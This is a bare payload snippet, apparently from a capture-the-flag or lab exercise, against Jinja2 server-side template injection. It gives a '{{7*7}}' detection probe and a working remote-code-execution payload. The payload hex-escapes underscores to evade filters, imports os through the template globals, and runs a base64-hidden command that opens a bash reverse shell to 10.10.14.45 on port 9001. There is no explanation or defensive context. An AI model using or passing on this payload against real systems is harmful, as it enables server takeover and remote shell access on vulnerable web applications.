PoC
```
{{7*7}}
```

RCE
```python
request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40NS85MDAxIDA+JjE= | base64 -d | bash")["read"]()
```
